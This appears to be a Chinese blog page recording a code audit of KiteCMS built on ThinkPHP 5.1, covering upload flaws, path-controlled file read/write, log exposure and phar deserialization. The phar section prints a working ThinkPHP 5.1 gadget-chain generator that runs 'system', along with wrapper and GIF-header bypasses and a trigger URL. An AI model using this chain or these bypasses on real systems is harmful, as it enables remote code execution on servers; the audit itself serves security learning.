@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>kitecms代码审计 · 随波逐流の旅店</title>
+<style>:root{--ink:#eaf3ff;--muted:#a9c3dd;--line:rgba(255,255,255,.2);--sky:#3aa3e3;--gold:#e0a545}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{min-height:100vh;color:var(--ink);font:16px/1.85 "PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;background:#0d2137 url('/SAO-bg.jpg') center/cover fixed no-repeat}
+body::before{content:'';position:fixed;inset:0;background:rgba(8,20,36,.7);z-index:-1}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:999px;background:rgba(226,236,248,.16);border:1px solid var(--line);color:#fff;text-decoration:none;font-size:14px;backdrop-filter:blur(12px);transition:.3s}
+.pill:hover{background:rgba(58,163,227,.5)}
+.wrap{max-width:860px;margin:0 auto;padding:44px 22px 80px}
+.panel{margin-top:18px;background:rgba(12,26,44,.62);border:1px solid var(--line);border-radius:20px;padding:34px 36px;backdrop-filter:blur(18px) saturate(140%);box-shadow:0 20px 50px rgba(5,16,30,.4)}
+h1{margin:0 0 14px;font-size:29px;line-height:1.4;color:#fff}
+.meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px;padding-bottom:18px;border-bottom:1px dashed var(--line)}
+.chip{padding:2px 11px;border-radius:999px;background:rgba(255,255,255,.12);border:1px solid var(--line);font-size:12px;color:var(--muted)}
+.chip.date{color:var(--gold)}
+article h2,article h3,article h4{color:#fff;margin:1.6em 0 .6em;line-height:1.45}
+article h2{font-size:23px;border-left:3px solid var(--sky);padding-left:12px}
+article h3{font-size:19px;color:#dcecff}
+article p{margin:.85em 0}
+article a{color:#8fd0ff}
+article img{max-width:100%;border-radius:10px;margin:14px 0}
+article ul,article ol{padding-left:1.5em}
+article li{margin:.35em 0}
+article blockquote{margin:1.2em 0;padding:10px 18px;border-left:3px solid var(--sky);background:rgba(255,255,255,.07);border-radius:0 10px 10px 0;color:var(--muted)}
+article code{background:rgba(255,255,255,.14);padding:2px 6px;border-radius:5px;font-size:.9em;color:#ffd9a8;font-family:Consolas,Monaco,monospace}
+article pre{background:rgba(6,14,26,.85);border:1px solid var(--line);border-radius:12px;padding:16px 18px;overflow:auto;margin:1.2em 0}
+article pre code{background:none;padding:0;color:#d6e6f7;font-size:13.5px;line-height:1.7}
+article table{width:100%;border-collapse:collapse;margin:1.2em 0;font-size:14px}
+article th,article td{border:1px solid var(--line);padding:8px 12px;text-align:left}
+article th{background:rgba(255,255,255,.07);color:#fff}
+article hr{border:none;border-top:1px dashed var(--line);margin:2em 0}
+.img-fallback{display:block;padding:18px;margin:14px 0;border:1px dashed var(--line);border-radius:10px;background:rgba(255,255,255,.05);color:var(--muted);font-size:13px;text-align:center}
+@media(max-width:640px){.panel{padding:22px 18px}.wrap{padding:24px 14px 60px}h1{font-size:22px}}</style>
+</head>
+<body>
+<div class="wrap">
+  <a class="pill" href="/article-list/">← 返回归档</a> <a class="pill" href="/">⌂ 主页</a>
+  <div class="panel">
+    <h1>kitecms代码审计</h1>
+    <div class="meta"><span class="chip date">2024-10-11</span><span class="chip">分类·代码审计</span><span class="chip">#代码审计</span></div>
+    <article><p>kitecms是基于thinkphp5搭建的，这个我搭建的时候按照两个方法都失败了，访问<code>/install</code>的时候安装不跳转，数据库安装倒是成功了<code>/config/database.php</code>也配置好了但是访问的时候报错</p>
+<p>就很奇怪</p>
+<p>所以我就单纯的看着教程和源码进行审计学习了</p>
+<p>thinkphp5.1比较上一代5.0，将配置目录和路由定义单独出来不在防御应用类库目录中（不可更改哦）</p>
+<h2>目录架构</h2>
+<pre><code>www WEB部署目录（或者子目录）
+├─application           应用目录
+│ ├─common             公共模块目录（可以更改）
+│ ├─module_name       模块目录
+│ │ ├─common.php     模块函数文件
+│ │ ├─controller     控制器目录
+│ │ ├─model           模型目录
+│ │ ├─view           视图目录
+│ │ ├─config         配置目录
+│ │ └─ ...           更多类库目录
+│ │
+│ ├─command.php       命令行定义文件
+│ ├─common.php         公共函数文件
+│ └─tags.php           应用行为扩展定义文件
+│
+├─config               应用配置目录
+│ ├─module_name       模块配置目录
+│ │ ├─database.php   数据库配置
+│ │ ├─cache           缓存配置
+│ │ └─ ...
+│ │
+│ ├─app.php           应用配置 相当于5.0中config.php
+│ ├─cache.php         缓存配置
+│ ├─cookie.php         Cookie配置
+│ ├─database.php       数据库配置
+│ ├─log.php           日志配置
+│ ├─session.php       Session配置
+│ ├─template.php       模板引擎配置
+│ └─trace.php         Trace配置
+│
+├─route                 路由定义目录
+│ ├─route.php         路由定义
+│ └─...               更多
+│
+├─public               WEB目录（对外访问目录）
+│ ├─index.php         入口文件
+│ ├─router.php         快速测试文件
+│ └─.htaccess         用于apache的重写
+│
+├─thinkphp             框架系统目录
+│ ├─lang               语言文件目录
+│ ├─library           框架类库目录
+│ │ ├─think           Think类库包目录
+│ │ └─traits         系统Trait目录
+│ │
+│ ├─tpl               系统模板目录
+│ ├─base.php           基础定义文件
+│ ├─convention.php     框架惯例配置文件
+│ ├─helper.php         助手函数文件
+│ └─logo.png           框架LOGO文件
+│
+├─extend               扩展类库目录
+├─runtime               应用的运行时目录（可写，可定制）
+├─vendor               第三方类库目录（Composer依赖库）
+├─build.php             自动生成定义文件（参考）
+├─composer.json         composer 定义文件
+├─LICENSE.txt           授权说明文件
+├─README.md             README 文件
+├─think                 命令行入口文件
+
+</code></pre>
+<h2>代码审计</h2>
+<p>由于该系统使用的是thinkphp框架，所以我们在审计的时候需要着重观察application文件夹下面的文件，</p>
+<pre><code>├admin                        后台代码
+├index                        前台代码
+├install                      安装代码
+├member                       用户注册以及会员的响应代码
+</code></pre>
+<h3>文件上传漏洞</h3>
+<p>（我没搭建成功，所以用的是教程里面的）</p>
+<p><img src="https://pic.imgdb.cn/item/6708c4bdd29ded1a8c820b42.png" alt="">
+这里是对上传的文件进行了配置，</p>
+<p>这里教程选择抓包查看路由配置信息</p>
+<p><img src="https://pic.imgdb.cn/item/6708cf8bd29ded1a8c8b3bc4.png" alt=""></p>
+<p><code>admin</code>的<code>site</code>的<code>config</code>，这里的html是伪静态，其实还是调用的<code>config()</code>方法</p>
+<p>（我们可以在<code>config</code>的<code>app.php</code>中看到他开了伪静态）</p>
+<p><img src="https://pic.imgdb.cn/item/6708d18bd29ded1a8c8cd1f8.png" alt=""></p>
+<p>打开<code>site.php</code>，查看里面的<code>config</code>函数</p>
+<p><img src="https://pic.imgdb.cn/item/6708d864d29ded1a8c92876f.png" alt=""></p>
+<p>20行调用了<code>isAjax</code>判断是否是Ajax请求，然后通过<code>Request::param</code>获取来自前端的数据并存储到<code>$request</code>中，</p>
+<p><img src="https://pic.imgdb.cn/item/6708e17dd29ded1a8c9be074.png" alt=""></p>
+<p>刚刚应该是在哦后台的时候添加了一个php的文件使得其可传输，所以我们我们抓一个上传的包看一眼就可以了</p>
+<p>上传包中都调用了<code>uploadFile</code>方法，全局搜索一下</p>
+<p><img src="https://pic.imgdb.cn/item/6708e213d29ded1a8c9c9ea2.png" alt=""></p>
+<p>这里调用了<code>Request::file</code>函数接收来自上传的文件,</p>
+<p>这里启了一个uploadfile的函数是获取当前站点id然后创建一个新的<code>uploadfile</code>的实例，跟踪一下</p>
+<p><img src="https://pic.imgdb.cn/item/6708e2e0d29ded1a8c9d8d80.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/6708e354d29ded1a8c9df8c6.png" alt=""></p>
+<p>首先从<code>config\site.php</code>获取site中的<code>uploadfile</code>和<code>imagewater</code>并且将其通过<code>array_merge</code>合并到一起，然后获取我们之前传入数据库的内容与配置文件进行合并</p>
+<p><img src="https://pic.imgdb.cn/item/6708e55bd29ded1a8ca06927.png" alt=""></p>
+<p>这里也做了一些限制</p>
+<p>继续顺着<code>uploadfile</code>，下面调用了<code>upload</code>函数，这里使用了<code>filetype</code>获取上传类型然后通过check检查后缀以及大小</p>
+<p><img src="https://pic.imgdb.cn/item/6708e600d29ded1a8ca129fd.png" alt=""></p>
+<p>case完了以后通过<code>upload</code>实现文件上传</p>
+<p>所以我们只需要在后台设置<code>.php</code>可上传，然后传就可以了</p>
+<h2>任意文件读写</h2>
+<p>通过全局搜索我们发现存在<code>file_put_contents</code>函数，</p>
+<p><img src="https://pic.imgdb.cn/item/670906eed29ded1a8cc0288e.png" alt=""></p>
+<p>而且里面的<code>html</code>参数可控，也就是说<code>file_put_contents</code>传入的内容可控</p>
+<p><code>htmlspecialchars_decode</code>是将由<code>htmlspecialchars</code>转换的html尸体进行解码，在前面的<code>rootpath</code>向上回溯发现是将根路径、主题文件夹、主题名称和文件相对路径拼接成一个完整的文件路径</p>
+<p><img src="https://pic.imgdb.cn/item/670909e1d29ded1a8cc24cef.png" alt=""></p>
+<p>这里的<code>$rootpath</code>通过param接收<code>$path</code>，而path是request获得的path路径，所以这个地方的<code>$path</code>可控</p>
+<p><img src="https://pic.imgdb.cn/item/67090af7d29ded1a8cc31ab3.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/67090b05d29ded1a8cc32612.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/67090a8bd29ded1a8cc2cf87.png" alt=""></p>
+<p>这里 相当于本来在<code>404.txt</code>中写但是改成了在<code>robots.txt</code>中加了一句<code>ceshi</code>,实现了任意文件读写</p>
+<h2>任意文件读取</h2>
+<p>全局搜索<code>file_get_contents</code>，发现在上面那个<code>file_put_contents</code>的在一个函数中，分析一下发现</p>
+<p><img src="https://pic.imgdb.cn/item/6709262cd29ded1a8cd89d33.png" alt=""></p>
+<p>他判断是不是post传参，如果不是的话走下面的else判断里面的<code>rootpath</code>，上面我们分析了<code>rootpath</code>里面的<code>$path</code>可控，所以这里会造成任意文件读取</p>
+<p><img src="https://pic.imgdb.cn/item/670927f3d29ded1a8cd9facd.png" alt=""></p>
+<p>它上面最后调用了</p>
+<pre><code>            return $this-&gt;fetch(&#39;fileedit&#39;, $data);
+</code></pre>
+<p>渲染<code>filedit</code>并将<code>$data</code>传给他</p>
+<p>所以存在任意文件读取</p>
+<p><img src="https://pic.imgdb.cn/item/67092889d29ded1a8cda81b5.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/670928a6d29ded1a8cda9cda.png" alt=""></p>
+<h2>phar反序列化</h2>
+<p>php使用的是内置的流包装器实现复杂的文件处理共嗯，内置包装器可用与文件系统函数</p>
+<pre><code class="language-常见的流包装器">
+file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
+http:// — 访问 HTTP(s) 网址
+ftp:// — 访问 FTP(s) URLs
+php:// — 访问各个输入/输出流（I/O streams）
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+glob:// — 查找匹配的文件路径模式
+phar:// — PHP 归档
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — 音频流
+expect:// — 处理交互式的流
+
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/6709305dd29ded1a8ce15840.png" alt=""></p>
+<h3>phar生成</h3>
+<pre><code>&lt;?php
+    class TestObject {
+    }
+    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+    $o = new TestObject();
+    $o -&gt; data=&#39;hu3sky&#39;;
+    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
+<h3>phar文件必要的结构组成</h3>
+<blockquote>
+<p>stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?&gt; 结尾，否则无法识别。xxx可以为自定义内容。</p>
+</blockquote>
+<blockquote>
+<p>manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。</p>
+</blockquote>
+<blockquote>
+<p>content:被压缩文件的内容</p>
+</blockquote>
+<blockquote>
+<p>signature (可空):签名，放在末尾。</p>
+</blockquote>
+<h3>绕过方法：</h3>
+<p>环境限制phar不能出现在前面的字符中，可以使用<code>compress.bzip2://</code>和<code>compress.bzip://</code>进行绕过</p>
+<pre><code>compress.bzip://phar:///test.phar/test.txt
+compress.bzip2://phar:///test.phar/test.txt
+compress.zlib://phar:///home/sx/test.phar/test.txt
+</code></pre>
+<p>或者使用其他协议</p>
+<pre><code>php://filter/read=convert.base64-encode/resource=phar://phar.phar
+
+</code></pre>
+<p>GIF格式验证中可以通过在文件头部添加GIT89a绕过</p>
+<pre><code>- $phar-&gt;setStub(&quot;GIF89a&quot;,&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);
+
+- 生成一个phar.phar 改名为phar.gif
+</code></pre>
+<h3>危害</h3>
+<p>攻击者可以通过PHAR反序列化漏洞来实现一下攻击：</p>
+<ol>
+<li>远程代码执行：攻击者可以利用反序列化漏洞来远程执行任意php代码并获取服务器完全控制权</li>
+<li>信息泄露：攻击者可以利用反序列化漏洞来读取服务器上的敏感数据，如数据库凭证，身份验证密码等</li>
+<li>篡改数据：攻击者可以利用反序列化漏洞改变服务器上的数据，如篡改网站内容，篡改数据库数据等</li>
+</ol>
+<h3>防范措施</h3>
+<ol>
+<li>及时更新代码中利用phar的库或插件，以修复已知的漏洞</li>
+<li>对用户输入的信息进行过滤和验证，确保输入的数据不包含恶意代码</li>
+<li>金庸不必要的反序列化对象或者对反序列化对象进行严格控制</li>
+<li>使用php的反序列化检测攻击检查潜在的远程代码执行漏洞</li>
+</ol>
+<p>这里的<code>$dir</code>参数完全可控，并且进入<code>is_dir()</code></p>
+<p><img src="https://pic.imgdb.cn/item/670a40cdd29ded1a8cb1d949.png" alt=""></p>
+<p>写tp5.1反序列化利用链生成phar文件</p>
+<pre><code>&lt;?php
+namespace think\process\pipes {
+  class Windows
+ {
+    private $files;
+    public function __construct($files)
+   {
+      $this-&gt;files = [$files];
+   }
+ }
+}
+namespace think\model\concern {
+  trait Conversion
+ {
+ }
+  trait Attribute
+ {
+    private $data;
+    private $withAttr = [&quot;v&quot; =&gt; &quot;system&quot;];
+    public function get()
+   {
+      $this-&gt;data = [&quot;v&quot; =&gt; &quot;calc&quot;];
+   }
+ }
+#这里生成我们的pahr文件，如果生成时报错了可以将php.ini配置文件中的phar.readonly选项设置为
+#Off就可以成功生成了。
+
+}
+namespace think {
+  abstract class Model
+ {
+    use model\concern\Attribute;
+    use model\concern\Conversion;
+ }
+}
+namespace think\model{
+  use think\Model;
+  class Pivot extends Model
+ {
+    public function __construct()
+   {
+      $this-&gt;get();
+   }
+ }
+}
+namespace {
+  $conver = new think\model\Pivot();
+  $a = new think\process\pipes\Windows($conver);
+  @unlink(&quot;phar.phar&quot;);
+  $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
+  $phar-&gt;startBuffering();
+  $phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+  $phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest
+  $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+//签名自动计算
+  $phar-&gt;stopBuffering();
+}
+?&gt;
+</code></pre>
+<p>打开访问会自动生成<code>phar.phar</code>（如果报错的话是因为你的<code>php.ini</code>里面没打开<code>phar_onreadly=off</code>）</p>
+<p><img src="https://pic.imgdb.cn/item/670b4891d29ded1a8c85b6c1.png" alt=""></p>
+<p>在010editor里面能看到我们的数据都写进去了</p>
+<p><img src="https://pic.imgdb.cn/item/670b48b0d29ded1a8c85ccf0.png" alt=""></p>
+<p>漏洞复现里面是在kitecms里面上传了phar.phar，改后缀为<code>.jpg</code>,</p>
+<p><img src="https://pic.imgdb.cn/item/670b4912d29ded1a8c861136.png" alt=""></p>
+<p>用phar协议解析就可以弹计算器</p>
+<p><img src="https://pic.imgdb.cn/item/670b4949d29ded1a8c8636fb.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/670b497ad29ded1a8c865846.png" alt=""></p>
+<p>顺便补一句这个下面的<code>$dir</code>也是可控的，所以也可以利用</p>
+<p><a href="http://127.0.0.1/admin/admin/scanFilesForTree?dir=phar://%E5%9C%B0%E5%9D%80">http://127.0.0.1/admin/admin/scanFilesForTree?dir=phar://地址</a></p>
+<h2>日志文件泄露</h2>
+<p><img src="https://pic.imgdb.cn/item/670b4ff7d29ded1a8c8e0aa3.png" alt=""></p>
+<p>在<code>config/app.php/log</code>中开启了调试模式，</p>
+<p><img src="https://pic.imgdb.cn/item/670b505bd29ded1a8c8f353c.png" alt=""></p>
+<p>也就是说开启了日志记录</p>
+<p><a href="https://pic.imgdb.cn/item/670b50a9d29ded1a8c902826.png">https://pic.imgdb.cn/item/670b50a9d29ded1a8c902826.png</a></p>
+<p>在日志配置文件<code>config/log.php</code>里面发现默认开启了日志记录</p>
+<p>访问<code>/runtime/log</code>目录，使用bp求情就能得到log日志文件</p>
+<h2>文件上传第二处</h2>
+<p><code>application/member/controller/Upload.php</code></p>
+<p><img src="https://pic.imgdb.cn/item/670b524ed29ded1a8c983e37.png" alt=""></p>
+<p>跟踪一下<code>upload</code>函数发现</p>
+<p>他只检查了后缀和大小，</p>
+<p><img src="https://pic.imgdb.cn/item/670b52b8d29ded1a8c993f0a.png" alt=""></p>
+<p>所以可以在会员中心，对着这个</p>
+<p><img src="https://pic.imgdb.cn/item/670b5317d29ded1a8c9a4b8d.png" alt=""></p>
+<p>然后修改上传的png为php</p>
+<p><img src="https://pic.imgdb.cn/item/670b532fd29ded1a8c9aca51.png" alt=""></p>
+<p>就能访问到phpinfo文件了</p>
+</article>
+  </div>
+</div><script>
+  // 正文插图兜底：失效图片替换为占位块，避免出现破图
+  document.querySelectorAll('article img').forEach(function (img) {
+    img.loading = 'lazy';
+    img.addEventListener('error', function () {
+      var ph = document.createElement('span');
+      ph.className = 'img-fallback';
+      ph.textContent = '图片已失效 · ' + (img.getAttribute('alt') || '');
+      if (img.parentNode) img.parentNode.replaceChild(ph, img);
+    });
+  });
+</script></body>
+</html>
